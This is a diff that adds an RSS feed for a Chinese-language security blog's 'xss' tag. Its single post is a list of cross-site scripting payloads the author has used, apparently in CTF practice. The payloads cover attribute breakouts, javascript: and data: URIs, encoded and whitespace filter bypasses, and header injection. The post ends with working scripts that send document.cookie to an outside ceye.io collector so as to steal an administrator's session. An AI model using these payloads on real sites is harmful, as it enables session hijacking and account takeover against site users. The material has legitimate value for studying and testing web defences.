@@ -1,0 +1,62 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>StarofEden🍀 • Posts by &#34;xss&#34; tag</title>
+        <link>https://StarofEden.github.io</link>
+        <description></description>
+        <language>zh-CN</language>
+        <pubDate>Thu, 31 Aug 2023 00:00:00 +0800</pubDate>
+        <lastBuildDate>Thu, 31 Aug 2023 00:00:00 +0800</lastBuildDate>
+        <category>JavaScript</category>
+        <category>nodejs</category>
+        <category>xctf</category>
+        <category>kali</category>
+        <category>web漏洞</category>
+        <category>xss</category>
+        <item>
+            <guid isPermalink="true">https://starofeden.github.io/2023/08/31/%E7%94%A8%E8%BF%87%E7%9A%84xss-POC/</guid>
+            <title>用过的xss POC</title>
+            <link>https://starofeden.github.io/2023/08/31/%E7%94%A8%E8%BF%87%E7%9A%84xss-POC/</link>
+            <category>xss</category>
+            <pubDate>Thu, 31 Aug 2023 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;用过的xss-poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用过的xss-poc&#34;&gt;#&lt;/a&gt; 用过的 xss POC&lt;/h1&gt;
+&lt;h2 id=&#34;常见poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常见poc&#34;&gt;#&lt;/a&gt; 常见 poc&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;confirm(&amp;#x27;xss&amp;#x27;)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;prompt(&amp;#x27;xss&amp;#x27;)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;在属性中对引号闭合并注释掉后面的内容&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#在属性中对引号闭合并注释掉后面的内容&#34;&gt;#&lt;/a&gt; 在属性中对引号闭合并注释掉后面的内容&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;input标签特殊事件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#input标签特殊事件&#34;&gt;#&lt;/a&gt; input 标签特殊事件&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;onfocus=javascript:alert(&amp;#x27;xss&amp;#x27;) &amp;gt;//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;对script标签和事件进行过滤但没有过滤javascript&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#对script标签和事件进行过滤但没有过滤javascript&#34;&gt;#&lt;/a&gt; 对 script 标签和事件进行过滤，但没有过滤 JavaScript&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt;&amp;lt;a href=javascript:alert(&amp;#x27;xss&amp;#x27;) &amp;gt; xss&amp;lt;/a&amp;gt;//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;data对字符进行编码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#data对字符进行编码&#34;&gt;#&lt;/a&gt; data: 对字符进行编码&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;html字符实体转换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#html字符实体转换&#34;&gt;#&lt;/a&gt; html 字符实体转换&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp;#x6A;&amp;amp;#x61;&amp;amp;#x76;&amp;amp;#x61;&amp;amp;#x73;&amp;amp;#x63;&amp;amp;#x72;&amp;amp;#x69;&amp;amp;#x70;&amp;amp;#x74;&amp;amp;#x3A;&amp;amp;#x61;&amp;amp;#x6C;&amp;amp;#x65;&amp;amp;#x72;&amp;amp;#x74;&amp;amp;#x28;&amp;amp;#x27;&amp;amp;#x78;&amp;amp;#x73;&amp;amp;#x73;&amp;amp;#x27;&amp;amp;#x29;//http://www.baidu.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;输入框被隐藏&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#输入框被隐藏&#34;&gt;#&lt;/a&gt; 输入框被隐藏&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;keyword=test&amp;amp;t_link=&amp;quot; type=&amp;quot;text&amp;quot; onmouseover=alert(1)// &amp;amp; t_history=&amp;quot; type=&amp;quot;text&amp;quot; onmouseover=alert(1)// &amp;amp; t_sort=&amp;quot; type=&amp;quot;text&amp;quot; onmouseover=alert(1)//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;bp抓包修改&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bp抓包修改&#34;&gt;#&lt;/a&gt; bp 抓包修改&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;referer: &amp;quot; type=&amp;quot;text&amp;quot; onmouseover=alert(1)//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;ng-include&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ng-include&#34;&gt;#&lt;/a&gt; ng-include&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?src=&amp;#x27;level1.php?name=&amp;lt;img src=1 onerror=alert(1)&amp;gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;格被编码为实体字符&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#格被编码为实体字符&#34;&gt;#&lt;/a&gt; 格被编码为实体字符&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;空格用 %0a 替代&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img%0asrc=1%0aonerror=alert(1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a%0Aonclick=&amp;#x27;alert(1)&amp;#x27;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;获取cookie&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#获取cookie&#34;&gt;#&lt;/a&gt; 获取 cookie&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;获得管理员cookie&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#获得管理员cookie&#34;&gt;#&lt;/a&gt; 获得管理员 cookie&lt;/h2&gt;
+&lt;p&gt;临时域名网站：&lt;a href=&#34;http://ceye.io/profile&#34;&gt;http://ceye.io/profile&lt;/a&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var img=document.createElement(&amp;quot;img&amp;quot;); img.src=&amp;quot;http://q6d5hx.ceye.io/&amp;quot;+document.cookie;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!--这里gvipx6.ceye.io是上述网址产生的临时域名--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;过滤了 script&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body onload=&amp;quot;window.open(&amp;#x27;http://q6d5hx.ceye.io/&amp;#x27;+document.cookie)&amp;quot;&amp;gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;过滤了空格（用 /**/ 或 / 替换）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body/οnlοad=&amp;quot;window.open(&amp;#x27;http://q6d5hx.ceye.io/&amp;#x27;+document.cookie)&amp;quot;&amp;gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
